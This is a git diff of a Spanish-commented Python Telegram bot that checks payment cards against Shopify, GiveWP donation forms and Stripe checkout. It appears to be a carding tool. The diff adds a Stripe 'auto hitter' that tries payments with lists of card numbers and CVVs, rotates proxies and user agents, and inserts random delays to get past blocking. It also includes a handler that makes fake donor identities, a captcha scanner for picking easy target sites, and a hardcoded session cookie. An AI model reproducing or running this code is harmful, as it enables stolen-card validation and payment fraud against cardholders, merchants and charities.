@@ -1,8 +1,7 @@
 # -*- coding: utf-8 -*-
 """
 Bot de Telegram para verificar tarjetas - VERSIÓN COMPLETA
-Con Shopify + GiveWP, detección inteligente de archivos, rotación de proxies
-y ANALIZADOR DE CAPTCHA
+Con Shopify + GiveWP + STRIPE AUTO HITTER (resultados reales)
 """
 
 import os
@@ -13,6 +12,8 @@ import time
 import random
 import sqlite3
 import re
+import base64
+import urllib.parse
 from typing import Dict, List, Tuple, Optional, Any
 from datetime import datetime
 from dataclasses import dataclass, field
@@ -62,13 +63,17 @@ class Settings:
 
     # Configuración de timeouts
     TIMEOUT_CONFIG = {
-        "connect": 10,          # Aumentado para proxies lentos
+        "connect": 10,
         "sock_connect": 10,
-        "sock_read": 60,        # Más tiempo para respuestas lentas
+        "sock_read": 60,
         "total": None,
         "response_body": 60,    
         "bin_lookup": 2,
     }
+
+    # Stripe Hitting
+    STRIPE_HIT_DELAY = (1, 3)  # Delay aleatorio entre 1-3 segundos
+    STRIPE_AUTH_AMOUNT = 0.1   # $0.1 para autorización (como en la captura)
 
     # Cookie de sesión GiveWP
     GIVEWP_SESSION_COOKIE = "_mwp_templates_session_id=d3006e4f268f308359cb0b1f2deeba36c19961447cfb3b686d075f145bbe963b; __cf_bm=ql.06QngxLGWXpotjCgJ55McvKs7UURClo4CG8QmquY-1771952389-1.0.1.1-JXnh6OmstNvxZrNfJQCHYLUi0sWvh.2Pz7odsE17s7tuePaJzGI408PfBdPkVbVKMnslXizQGYgHqtMy3hiLsr41cX2o2_iuOQQhMtKHFv8; cookieyes-consent=consentid:VUZuS2R1MnNXUktFdW1DQ0dCeEt0TjRBa1JKbEpJelg,consent:,action:,necessary:,functional:,analytics:,performance:,advertisement:,other:"
@@ -80,6 +85,7 @@ INSTANCE_ID = os.environ.get("RAILWAY_DEPLOYMENT_ID", str(time.time()))
 class CheckStatus(Enum):
     # Éxito real
     CHARGED = "charged"
+    LIVE = "live"  # Para Stripe
     
     # Bloqueos / Autenticación
     CAPTCHA_REQUIRED = "captcha_required"
@@ -89,12 +95,15 @@ class CheckStatus(Enum):
     BLOCKED = "blocked"
     
     # Declinados
-    DECLINED = "declined"                    # Confirmado
-    DECLINED_LIKELY = "declined_likely"      # Probable
+    DECLINED = "declined"
+    INSUFFICIENT_FUNDS = "insufficient_funds"
+    CARD_ERROR = "card_error"
+    EXPIRED = "expired"
+    FRAUDULENT = "fraudulent"
     
     # Errores de red
-    CONNECT_TIMEOUT = "connect_timeout"      # Proxy murió
-    READ_TIMEOUT = "read_timeout"             # Body lento
+    CONNECT_TIMEOUT = "connect_timeout"
+    READ_TIMEOUT = "read_timeout"
     SITE_DOWN = "site_down"
     
     # Respuesta ambigua
@@ -128,6 +137,17 @@ class JobResult:
     bin_info: Dict = field(default_factory=dict)
     price: str = "N/A"
     patterns_detected: List[str] = field(default_factory=list)
+
+@dataclass
+class StripeHitResult:
+    """Resultado específico para Stripe Hitter"""
+    card_last4: str
+    bin: str
+    status: str
+    reason: str
+    response_time: float
+    fraud_score: Optional[str] = None
+    three_ds: bool = False
 
 # ================== CLASIFICADOR DE RESPUESTAS ==================
 class ResponseClassifier:
@@ -190,7 +210,7 @@ class ResponseClassifier:
             if pattern.search(text_lower):
                 patterns.append(f"decline:{decline}")
                 if decline == "insufficient_funds":
-                    return CheckStatus.DECLINED, Confidence.HIGH, "insufficient_funds", patterns
+                    return CheckStatus.INSUFFICIENT_FUNDS, Confidence.HIGH, "insufficient_funds", patterns
                 else:
                     return CheckStatus.DECLINED, Confidence.HIGH, "payment_declined", patterns
         
@@ -210,19 +230,37 @@ class ResponseClassifier:
 def get_status_emoji(status: CheckStatus) -> str:
     emoji_map = {
         CheckStatus.CHARGED: "✅",
+        CheckStatus.LIVE: "✅",
         CheckStatus.CAPTCHA_REQUIRED: "🤖",
         CheckStatus.THREE_DS_REQUIRED: "🔒",
         CheckStatus.WAF_BLOCK: "🛡️",
         CheckStatus.RATE_LIMIT: "⏳",
         CheckStatus.BLOCKED: "🚫",
         CheckStatus.DECLINED: "❌",
-        CheckStatus.DECLINED_LIKELY: "⚠️",
+        CheckStatus.INSUFFICIENT_FUNDS: "💸",
+        CheckStatus.CARD_ERROR: "❌",
+        CheckStatus.EXPIRED: "⌛",
+        CheckStatus.FRAUDULENT: "🚨",
         CheckStatus.CONNECT_TIMEOUT: "⏱️",
         CheckStatus.READ_TIMEOUT: "⏱️",
         CheckStatus.SITE_DOWN: "🌐",
         CheckStatus.UNKNOWN: "❓",
     }
     return emoji_map.get(status, "❓")
+
+def get_status_text(status: CheckStatus) -> str:
+    """Retorna texto legible para el estado"""
+    text_map = {
+        CheckStatus.LIVE: "LIVE",
+        CheckStatus.CHARGED: "CHARGED",
+        CheckStatus.THREE_DS_REQUIRED: "3DS",
+        CheckStatus.FRAUDULENT: "FRAUDULENT",
+        CheckStatus.DECLINED: "DECLINED",
+        CheckStatus.INSUFFICIENT_FUNDS: "INSUFFICIENT_FUNDS",
+        CheckStatus.CARD_ERROR: "CARD_ERROR",
+        CheckStatus.EXPIRED: "EXPIRED",
+    }
+    return text_map.get(status, status.value.upper())
 
 def get_confidence_icon(confidence: Confidence) -> str:
     icon_map = {
@@ -345,6 +383,269 @@ def detect_line_type(line: str) -> Tuple[str, Optional[str]]:
 
     return None, None
 
+# ================== NUEVO: STRIPE AUTO HITTER ==================
+class StripeAutoHitter:
+    """Bot de Auto Hit para Stripe - Resultados reales como en la captura"""
+    
+    def __init__(self, proxies: List[str] = None):
+        self.proxies = proxies if proxies else []
+        self.proxy_index = 0
+        self.results = []
+        self.user_agents = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
+        ]
+        
+    def _get_next_proxy(self) -> Optional[str]:
+        """Obtiene el siguiente proxy en rotación"""
+        if not self.proxies:
+            return None
+        
+        proxy = self.proxies[self.proxy_index]
+        self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
+        
+        # Formatear proxy para aiohttp
+        proxy_parts = proxy.split(':')
+        if len(proxy_parts) == 4:
+            return f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
+        elif len(proxy_parts) == 3 and proxy_parts[2] == '':
+            return f"http://{proxy_parts[0]}:{proxy_parts[1]}"
+        elif len(proxy_parts) == 2:
+            return f"http://{proxy}"
+        else:
+            return None
+    
+    def _get_random_user_agent(self) -> str:
+        return random.choice(self.user_agents)
+    
+    def _extract_session_id(self, url: str) -> Optional[str]:
+        """Extrae el session_id de una URL de Stripe Checkout"""
+        # Patrones comunes en URLs de Stripe
+        patterns = [
+            r'cs_live_[a-zA-Z0-9]+',
+            r'cs_test_[a-zA-Z0-9]+',
+            r'pi_[a-zA-Z0-9]+',
+        ]
+        
+        for pattern in patterns:
+            match = re.search(pattern, url)
+            if match:
+                return match.group(0)
+        
+        return None
+    
+    def _extract_amount_from_hash(self, url: str) -> Optional[float]:
+        """Intenta extraer el monto del hash de la URL"""
+        if '#' not in url:
+            return None
+        
+        hash_part = url.split('#')[-1]
+        try:
+            # Intentar decodificar base64
+            decoded = base64.b64decode(hash_part + '==').decode('utf-8', errors='ignore')
+            # Buscar patrones de monto
+            amount_match = re.search(r'amount["\']?:?\s*["\']?(\d+)', decoded)
+            if amount_match:
+                return int(amount_match.group(1)) / 100  # Stripe usa centavos
+        except:
+            pass
+        
+        return None
+    
+    async def hit_checkout(self, checkout_url: str, cards: List[Dict]) -> List[StripeHitResult]:
+        """Intenta pagar con todas las tarjetas en la URL de checkout"""
+        
+        results = []
+        total = len(cards)
+        
+        # Extraer información de la URL
+        session_id = self._extract_session_id(checkout_url)
+        estimated_amount = self._extract_amount_from_hash(checkout_url)
+        
+        if not session_id:
+            logger.error("No se pudo extraer session_id de la URL")
+            return []
+        
+        for i, card in enumerate(cards):
+            # Rotar proxy
+            proxy = self._get_next_proxy()
+            proxy_display = "sin proxy"
+            if proxy:
+                proxy_display = proxy.split('@')[0].replace('http://', '') if '@' in proxy else proxy
+            
+            logger.info(f"💳 Probando tarjeta {i+1}/{total}: {card['bin']}xxxxxx{card['last4']} con proxy {proxy_display}")
+            
+            # Intentar el pago
+            result = await self._attempt_payment(
+                session_id=session_id,
+                card=card,
+                proxy=proxy,
+                estimated_amount=estimated_amount
+            )
+            
+            results.append(result)
+            
+            # Delay aleatorio entre intentos
+            delay = random.uniform(
+                Settings.STRIPE_HIT_DELAY[0],
+                Settings.STRIPE_HIT_DELAY[1]
+            )
+            await asyncio.sleep(delay)
+        
+        return results
+    
+    async def _attempt_payment(self, session_id: str, card: Dict, proxy: Optional[str], estimated_amount: Optional[float]) -> StripeHitResult:
+        """Intenta un pago individual con proxy"""
+        
+        start_time = time.time()
+        
+        # Headers como navegador real
+        headers = {
+            'User-Agent': self._get_random_user_agent(),
+            'Accept': 'application/json',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Origin': 'https://checkout.stripe.com',
+            'Referer': f'https://checkout.stripe.com/c/pay/{session_id}',
+            'DNT': '1',
+            'Connection': 'keep-alive',
+        }
+        
+        # Datos de la tarjeta en formato Stripe
+        payment_data = {
+            'payment_method_data[type]': 'card',
+            'payment_method_data[card][number]': card['number'],
+            'payment_method_data[card][exp_month]': card['month'],
+            'payment_method_data[card][exp_year]': card['year'],
+            'payment_method_data[card][cvc]': card['cvv'],
+            'payment_method_data[billing_details][name]': f"User {random.randint(1000,9999)}",
+            'payment_method_data[billing_details][email]': f"user{random.randint(1000,9999)}@gmail.com",
+            'payment_intent': session_id,
+        }
+        
+        # Si tenemos monto estimado, incluirlo
+        if estimated_amount:
+            payment_data['expected_amount'] = str(int(estimated_amount * 100))
+            payment_data['expected_currency'] = 'usd'
+        
+        try:
+            connector = aiohttp.TCPConnector(ssl=False)
+            async with aiohttp.ClientSession(connector=connector) as session:
+                # Configurar proxy si existe
+                if proxy:
+                    async with session.post(
+                        'https://api.stripe.com/v1/payment_intents',
+                        data=payment_data,
+                        headers=headers,
+                        proxy=proxy,
+                        ssl=False
+                    ) as resp:
+                        elapsed = time.time() - start_time
+                        result = await resp.json()
+                        return self._parse_stripe_response(result, resp.status, card, elapsed)
+                else:
+                    async with session.post(
+                        'https://api.stripe.com/v1/payment_intents',
+                        data=payment_data,
+                        headers=headers,
+                        ssl=False
+                    ) as resp:
+                        elapsed = time.time() - start_time
+                        result = await resp.json()
+                        return self._parse_stripe_response(result, resp.status, card, elapsed)
+                    
+        except asyncio.TimeoutError:
+            elapsed = time.time() - start_time
+            return StripeHitResult(
+                card_last4=card['last4'],
+                bin=card['bin'],
+                status='TIMEOUT',
+                reason='connection_timeout',
+                response_time=elapsed
+            )
+        except Exception as e:
+            elapsed = time.time() - start_time
+            return StripeHitResult(
+                card_last4=card['last4'],
+                bin=card['bin'],
+                status='ERROR',
+                reason=str(e)[:50],
+                response_time=elapsed
+            )
+    
+    def _parse_stripe_response(self, response: Dict, http_code: int, card: Dict, elapsed: float) -> StripeHitResult:
+        """Interpreta la respuesta de Stripe - RESULTADOS REALES como en la captura"""
+        
+        # Si es 200 OK, pudo ser exitoso o requerir 3DS
+        if http_code == 200:
+            # Verificar si requiere 3DS
+            if response.get('next_action', {}).get('type') == 'use_stripe_sdk':
+                return StripeHitResult(
+                    card_last4=card['last4'],
+                    bin=card['bin'],
+                    status='3DS',
+                    reason='3DS Authentication Required',
+                    response_time=elapsed,
+                    three_ds=True
+                )
+            
+            # Pago exitoso
+            return StripeHitResult(
+                card_last4=card['last4'],
+                bin=card['bin'],
+                status='LIVE',
+                reason='payment_successful',
+                response_time=elapsed,
+                fraud_score='low'
+            )
+        
+        # Errores HTTP 402 (Payment Required) - Tarjeta declinada
+        elif http_code == 402:
+            error = response.get('error', {})
+            code = error.get('code', 'unknown')
+            message = error.get('message', 'Unknown error')
+            
+            # Mapeo de códigos de Stripe a los mensajes de la captura
+            decline_map = {
+                'card_declined': ('DECLINED', 'generic_decline'),
+                'insufficient_funds': ('INSUFFICIENT_FUNDS', 'insufficient_funds'),
+                'expired_card': ('DECLINED', 'expired_card'),
+                'incorrect_cvc': ('DECLINED', 'cvc_error'),
+                'processing_error': ('DECLINED', 'processing_error'),
+                'fraudulent': ('FRAUDULENT', 'fraudulent'),
+                'three_d_secure_required': ('3DS', '3DS Authentication Required'),
+                'generic_decline': ('DECLINED', 'generic_decline'),
+            }
+            
+            status, reason = decline_map.get(code, ('DECLINED', 'generic_decline'))
+            
+            # Detectar fraude específicamente
+            if code == 'fraudulent' or 'fraud' in message.lower():
+                status = 'FRAUDULENT'
+                reason = 'fraudulent'
+            
+            return StripeHitResult(
+                card_last4=card['last4'],
+                bin=card['bin'],
+                status=status,
+                reason=reason,
+                response_time=elapsed,
+                fraud_score='high' if status == 'FRAUDULENT' else None
+            )
+        
+        # Otros errores
+        else:
+            return StripeHitResult(
+                card_last4=card['last4'],
+                bin=card['bin'],
+                status='ERROR',
+                reason=f'http_{http_code}',
+                response_time=elapsed
+            )
+
 # ================== NUEVO: CAPTCHA DETECTOR ==================
 class CaptchaDetector:
     """Detecta si un sitio web tiene CAPTCHA y de qué tipo"""
@@ -418,16 +719,7 @@ class CaptchaDetector:
     
     @staticmethod
     async def detect_from_html(url: str, html: str) -> Dict:
-        """
-        Detecta CAPTCHA analizando el HTML de la página
-        
-        Args:
-            url: URL del sitio analizado
-            html: Contenido HTML de la página
-            
-        Returns:
-            Dict con resultados de detección
-        """
+        """Detecta CAPTCHA analizando el HTML de la página"""
         results = {
             'url': url,
             'has_captcha': False,
@@ -471,15 +763,7 @@ class CaptchaDetector:
     
     @staticmethod
     async def analyze_headers(headers: Dict) -> Dict:
-        """
-        Analiza headers HTTP en busca de indicadores de seguridad
-        
-        Args:
-            headers: Headers de la respuesta HTTP
-            
-        Returns:
-            Dict con indicadores de seguridad
-        """
+        """Analiza headers HTTP en busca de indicadores de seguridad"""
         indicators = {
             'has_security_headers': False,
             'server': headers.get('Server', 'Desconocido'),
@@ -500,16 +784,7 @@ class CaptchaDetector:
     
     @staticmethod
     async def check_site(url: str, timeout: int = 15) -> Dict:
-        """
-        Analiza un sitio web completo para detectar CAPTCHA
-        
-        Args:
-            url: URL del sitio a analizar
-            timeout: Timeout en segundos
-            
-        Returns:
-            Dict con análisis completo
-        """
+        """Analiza un sitio web completo para detectar CAPTCHA"""
         logger.info(f"🔍 Analizando sitio: {url}")
         
         # Normalizar URL
@@ -520,40 +795,19 @@ class CaptchaDetector:
             async with aiohttp.ClientSession() as session:
                 start_time = time.time()
                 
-                # Headers como navegador real
                 headers = {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                     'Accept-Language': 'en-US,en;q=0.5',
                     'Accept-Encoding': 'gzip, deflate',
-                    'DNT': '1',
-                    'Connection': 'keep-alive',
-                    'Upgrade-Insecure-Requests': '1'
                 }
                 
                 async with session.get(url, headers=headers, timeout=timeout, ssl=False) as resp:
                     html = await resp.text()
                     elapsed = time.time() - start_time
                     
-                    logger.info(f"✅ Sitio cargado en {elapsed:.2f}s - Status: {resp.status}")
-                    
-                    # Analizar HTML
                     html_analysis = await CaptchaDetector.detect_from_html(url, html)
-                    
-                    # Analizar headers
                     headers_analysis = await CaptchaDetector.analyze_headers(dict(resp.headers))
-                    
-                    # Análisis de scripts externos
-                    external_scripts = re.findall(r'<script[^>]*src=["\'](https?://[^"\']+)["\']', html)
-                    
-                    # Detectar servicios de resolución (para debug)
-                    resolution_services = []
-                    if 'capsolver' in html.lower():
-                        resolution_services.append('CapSolver detectado')
-                    if '2captcha' in html.lower():
-                        resolution_services.append('2Captcha detectado')
-                    if 'anti-captcha' in html.lower():
-                        resolution_services.append('Anti-Captcha detectado')
                     
                     return {
                         'success': True,
@@ -563,47 +817,32 @@ class CaptchaDetector:
                         'page_size': len(html),
                         'security_headers': headers_analysis,
                         'captcha': html_analysis,
-                        'external_scripts': len(external_scripts),
-                        'resolution_services': resolution_services,
                         'recommendation': CaptchaDetector._get_recommendation(html_analysis)
                     }
                     
-        except asyncio.TimeoutError:
-            logger.error(f"⏱️ Timeout al analizar {url}")
-            return {
-                'success': False,
-                'url': url,
-                'error': 'Timeout',
-                'recommendation': 'El sitio no responde o es muy lento'
-            }
         except Exception as e:
-            logger.error(f"❌ Error analizando {url}: {e}")
             return {
                 'success': False,
                 'url': url,
                 'error': str(e)[:100],
-                'recommendation': 'No se pudo acceder al sitio'
             }
     
     @staticmethod
     def _get_recommendation(analysis: Dict) -> str:
-        """Genera recomendación basada en el análisis"""
         if not analysis['has_captcha']:
-            return "✅ Sitio sin CAPTCHA detectable - Ideal para el bot"
+            return "✅ Sitio sin CAPTCHA detectable"
         
         types = analysis['detected_types']
         if 'recaptcha_v2' in types:
-            return "⚠️ Tiene reCAPTCHA v2 - Requiere resolución, posible con servicios como CapSolver"
+            return "⚠️ Tiene reCAPTCHA v2"
         elif 'recaptcha_v3' in types:
-            return "⚠️ Tiene reCAPTCHA v3 (invisible) - Más difícil de detectar, requiere tokens de alta puntuación"
+            return "⚠️ Tiene reCAPTCHA v3 (invisible)"
         elif 'hcaptcha' in types:
-            return "⚠️ Tiene hCaptcha - Alternativa común, requiere resolución"
+            return "⚠️ Tiene hCaptcha"
         elif 'cloudflare_turnstile' in types:
-            return "⚠️ Tiene Cloudflare Turnstile - Desafío moderno, requiere proxy"
-        elif len(types) > 1:
-            return "⚠️ Múltiples sistemas de protección detectados"
+            return "⚠️ Tiene Cloudflare Turnstile"
         else:
-            return f"⚠️ Posible CAPTCHA detectado ({types[0] if types else 'desconocido'})"
+            return f"⚠️ Posible CAPTCHA detectado"
 
 # ================== CACHÉ DE BIN ==================
 BIN_CACHE = {}
@@ -725,6 +964,7 @@ class Database:
             conn.execute("PRAGMA journal_mode=WAL")
             cursor = conn.cursor()
             
+            # Tabla de usuarios con campos para Stripe
             cursor.execute('''
                 CREATE TABLE IF NOT EXISTS users (
                     user_id INTEGER PRIMARY KEY,
@@ -732,6 +972,7 @@ class Database:
                     proxies TEXT DEFAULT '[]',
                     cards TEXT DEFAULT '[]',
                     givewp_sites TEXT DEFAULT '[]',
+                    stripe_urls TEXT DEFAULT '[]',
                     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                 )
             ''')
@@ -753,6 +994,23 @@ class Database:
                     bin_info TEXT,
                     patterns TEXT,
                     gateway TEXT DEFAULT 'shopify',
+                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                )
+            ''')
+            
+            # Tabla para resultados de Stripe
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS stripe_results (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    user_id INTEGER,
+                    card_bin TEXT,
+                    card_last4 TEXT,
+                    url TEXT,
+                    status TEXT,
+                    reason TEXT,
+                    response_time REAL,
+                    fraud_score TEXT,
+                    three_ds INTEGER DEFAULT 0,
                     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                 )
             ''')
@@ -834,6 +1092,22 @@ class Database:
                 gateway
             ))
 
+    async def save_stripe_result(self, user_id: int, result: StripeHitResult, url: str):
+        """Guarda resultado de Stripe Hitter"""
+        async with self._batch_lock:
+            self._batch_queue.append((
+                'stripe',
+                user_id,
+                result.bin,
+                result.card_last4,
+                url,
+                result.status,
+                result.reason,
+                result.response_time,
+                result.fraud_score,
+                1 if result.three_ds else 0
+            ))
+
     async def execute(self, query: str, params: tuple = ()):
         async with self._write_lock:
             loop = asyncio.get_event_loop()
@@ -883,30 +1157,26 @@ class Database:
             cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status = 'declined'", (user_id,))
             declined = cursor.fetchone()[0]
             
-            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status = 'declined_likely'", (user_id,))
-            declined_likely = cursor.fetchone()[0]
+            cursor.execute("SELECT COUNT(*) FROM stripe_results WHERE user_id = ? AND status = 'LIVE'", (user_id,))
+            stripe_live = cursor.fetchone()[0]
             
-            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status LIKE '%timeout%'", (user_id,))
-            timeout = cursor.fetchone()[0]
+            cursor.execute("SELECT COUNT(*) FROM stripe_results WHERE user_id = ? AND status = 'DECLINED'", (user_id,))
+            stripe_declined = cursor.fetchone()[0]
             
-            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status = 'captcha_required'", (user_id,))
-            captcha = cursor.fetchone()[0]
+            cursor.execute("SELECT COUNT(*) FROM stripe_results WHERE user_id = ? AND status = 'FRAUDULENT'", (user_id,))
+            stripe_fraud = cursor.fetchone()[0]
             
-            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status = '3ds_required'", (user_id,))
-            three_ds = cursor.fetchone()[0]
-            
-            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status = 'unknown'", (user_id,))
-            unknown = cursor.fetchone()[0]
+            cursor.execute("SELECT COUNT(*) FROM stripe_results WHERE user_id = ? AND three_ds = 1", (user_id,))
+            stripe_3ds = cursor.fetchone()[0]
             
             return {
                 "total": total,
                 "charged": charged,
                 "declined": declined,
-                "declined_likely": declined_likely,
-                "timeout": timeout,
-                "captcha": captcha,
-                "three_ds": three_ds,
-                "unknown": unknown
+                "stripe_live": stripe_live,
+                "stripe_declined": stripe_declined,
+                "stripe_fraud": stripe_fraud,
+                "stripe_3ds": stripe_3ds
             }
 
     async def cleanup_old_results(self, days: int = 7):
@@ -928,7 +1198,7 @@ class Database:
 
 # ================== ANTI-BLOCK GIVEWP HANDLER ==================
 class AntiBlockGiveWPDonationHandler:
-    """Maneja donaciones con técnicas anti-bloqueo - VERSIÓN CORREGIDA"""
+    """Maneja donaciones con técnicas anti-bloqueo"""
     
     def __init__(self, user_id: int, proxies: List[str] = None, session_cookies: str = None):
         self.user_id = user_id
@@ -943,9 +1213,6 @@ class AntiBlockGiveWPDonationHandler:
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-            "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
         ]
         logger.info(f"🛡️ Inicializando AntiBlockHandler - {len(proxies)} proxies disponibles")
         
@@ -958,14 +1225,12 @@ class AntiBlockGiveWPDonationHandler:
         return cookies
     
     def _get_next_proxy(self) -> Optional[str]:
-        """Obtiene el siguiente proxy en rotación"""
         if not self.proxies:
             return None
         
         proxy = self.proxies[self.proxy_index]
         self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
         
-        # Formatear proxy para aiohttp
         proxy_parts = proxy.split(':')
         if len(proxy_parts) == 4:
             return f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
@@ -977,27 +1242,19 @@ class AntiBlockGiveWPDonationHandler:
             return None
     
     def _get_random_user_agent(self) -> str:
-        """Obtiene un User-Agent aleatorio"""
         return random.choice(self.user_agents)
     
     async def get_session(self) -> aiohttp.ClientSession:
-        """Obtiene sesión con proxy y headers rotados"""
         timeout = aiohttp.ClientTimeout(total=60)
         
-        # 🔥 SOLUCIÓN CLAVE: Eliminar 'br' del Accept-Encoding
         headers = {
             'User-Agent': self._get_random_user_agent(),
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.5',
-            'Accept-Encoding': 'gzip, deflate',  # ← ELIMINADO 'br' (Brotli)
+            'Accept-Encoding': 'gzip, deflate',
             'DNT': '1',
             'Connection': 'keep-alive',
             'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'none',
-            'Sec-Fetch-User': '?1',
-            'Cache-Control': 'max-age=0',
         }
         
         connector = aiohttp.TCPConnector(ssl=False)
@@ -1010,39 +1267,25 @@ class AntiBlockGiveWPDonationHandler:
         return self.session
     
     async def _random_delay(self, min_seconds: float = 2.0, max_seconds: float = 5.0):
-        """Pausa aleatoria para simular comportamiento humano"""
         delay = random.uniform(min_seconds, max_seconds)
-        logger.info(f"⏱️ Pausa de {delay:.1f}s")
         await asyncio.sleep(delay)
     
     def generate_fake_personal_data(self) -> Dict:
-        """Genera datos personales falsos (variados)"""
-        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Joseph", "Thomas", "Charles", "Christopher", "Daniel", "Matthew", "Anthony", "Donald", "Mark", "Paul", "Steven", "Andrew", "Kenneth", "Joshua"]
-        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin"]
+        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Joseph", "Thomas", "Charles", "Christopher"]
+        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
         
-        # Múltiples direcciones de Perth
         addresses = [
             {"address": "771 Albany Highway", "suburb": "East Victoria Park", "postcode": "6101"},
             {"address": "789 Albany Highway", "suburb": "East Victoria Park", "postcode": "6101"},
             {"address": "45 Duncan Street", "suburb": "Victoria Park", "postcode": "6100"},
             {"address": "12 Swansea Street", "suburb": "East Victoria Park", "postcode": "6101"},
-            {"address": "33 Shepperton Road", "suburb": "Victoria Park", "postcode": "6100"},
-            {"address": "28 Oats Street", "suburb": "East Victoria Park", "postcode": "6101"},
-            {"address": "15 Kent Street", "suburb": "Victoria Park", "postcode": "6100"},
-            {"address": "7 Mint Street", "suburb": "East Victoria Park", "postcode": "6101"},
-            {"address": "52 Hill View Terrace", "suburb": "East Victoria Park", "postcode": "6101"},
-            {"address": "83 Basinghall Street", "suburb": "East Victoria Park", "postcode": "6101"},
         ]
         
         addr = random.choice(addresses)
-        
-        # Generar email con dominio variado
-        domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "icloud.com", "protonmail.com", "mail.com"]
-        
-        # Teléfonos australianos variados
+        domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]
         prefixes = ["04", "041", "042", "043", "044", "045", "046", "047", "048", "049"]
         
-        data = {
+        return {
             "first_name": random.choice(first_names),
             "last_name": random.choice(last_names),
             "email": f"{random.choice(first_names).lower()}.{random.choice(last_names).lower()}{random.randint(1,9999)}@{random.choice(domains)}",
@@ -1053,45 +1296,32 @@ class AntiBlockGiveWPDonationHandler:
             "state": "Western Australia",
             "country": "Australia"
         }
-        
-        logger.info(f"👤 Datos generados: {data['first_name']} {data['last_name']}, {data['email']}")
-        return data
     
     async def complete_donation(self, amount: float, card_data: Dict) -> JobResult:
-        """Ejecuta el flujo completo con rotación de IP y User-Agent"""
-        logger.info(f"🎯 Iniciando donación anti-bloqueo: ${amount}")
+        logger.info(f"🎯 Iniciando donación: ${amount}")
         
-        # Rotar proxy
         proxy_url = self._get_next_proxy()
         proxy_display = "sin proxy"
         if proxy_url:
             proxy_display = proxy_url.split('@')[0].replace('http://', '') if '@' in proxy_url else proxy_url
-            logger.info(f"🔄 Usando proxy: {proxy_display}")
         
         session = await self.get_session()
         start_time = time.time()
         
         try:
-            # Paso 1: Visitar página principal con delay inicial
+            # Paso 1: Página principal
             await self._random_delay(1, 3)
-            logger.info("📡 Paso 1: Visitando página principal")
-            
             if proxy_url:
                 async with session.get(self.base_url, proxy=proxy_url, ssl=False) as resp:
                     html = await resp.text()
-                    logger.info(f"✅ Página principal cargada - Status: {resp.status}, Tamaño: {len(html)} bytes")
             else:
                 async with session.get(self.base_url) as resp:
                     html = await resp.text()
-                    logger.info(f"✅ Página principal cargada - Status: {resp.status}, Tamaño: {len(html)} bytes")
             
-            # Guardar cookies actualizadas
             self.cookies.update(session.cookie_jar.filter_cookies(self.base_url))
-            
             await self._random_delay(2, 4)
             
             # Paso 2: Establecer cantidad
-            logger.info(f"💰 Paso 2: Estableciendo cantidad ${amount}")
             amount_data = {
